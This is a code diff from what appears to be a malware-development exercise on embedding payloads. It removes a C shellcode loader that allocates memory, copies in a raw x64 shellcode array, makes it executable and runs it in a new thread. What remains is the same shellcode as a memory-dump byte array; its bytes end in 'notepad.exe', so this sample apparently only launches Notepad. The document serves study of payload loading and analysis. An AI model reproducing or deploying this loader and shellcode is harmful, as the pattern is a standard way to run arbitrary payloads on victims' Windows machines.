@@ -1,12 +1,7 @@
+/* C:\Users\malware\Desktop\04c-embeddingPayload\reversing_payload\Memory Dumping\dump2From0x000002c608.bin (7/5/2024 7:20:23 PM)
+   StartOffset(h): 00000000, EndOffset(h): 0000011F, Length(h): 00000120 */
 
-#include <windows.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-
-
-
-unsigned char shellcodePayload[279] = {
+unsigned char rawData[288] = {
 	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
 	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
 	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
@@ -30,37 +25,5 @@ unsigned char shellcodePayload[279] = {
 	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
 	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
 	0xDA, 0xFF, 0xD5, 0x6E, 0x6F, 0x74, 0x65, 0x70, 0x61, 0x64, 0x2E, 0x65,
-	0x78, 0x65, 0x00
+	0x78, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
 };
-	
-unsigned int lengthOfshellcodePayload = 279;
-
-int main(void) {
-    
-	void * alloc_mem;
-	BOOL retval;
-	HANDLE threadHandle;
-    DWORD oldprotect = 0;
-	
-	// Allocate some memory space for shellcodePayload
-	alloc_mem = VirtualAlloc(0, lengthOfshellcodePayload, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-	printf("%-20s : 0x%-016p\n", "shellcodePayload addr", (void *)shellcodePayload);
-	printf("%-20s : 0x%-016p\n", "alloc_mem addr", (void *)alloc_mem);
-
-	// Copy shellcodePayload to newly allocated memory
-	RtlMoveMemory(alloc_mem, shellcodePayload, lengthOfshellcodePayload);
-	
-	// Set the newly allocated memory to be executable
-	retval = VirtualProtect(alloc_mem, lengthOfshellcodePayload, PAGE_EXECUTE_READ, &oldprotect);
-
-	printf("\nPress Enter to Create Thread!\n");
-	getchar();
-
-	// If VirtualProtect succeeded, run the thread that contains the shellcodePayload
-	if ( retval != 0 ) {
-			threadHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) alloc_mem, 0, 0, 0);
-			WaitForSingleObject(threadHandle, -1);
-	}
-
-	return 0;
-}
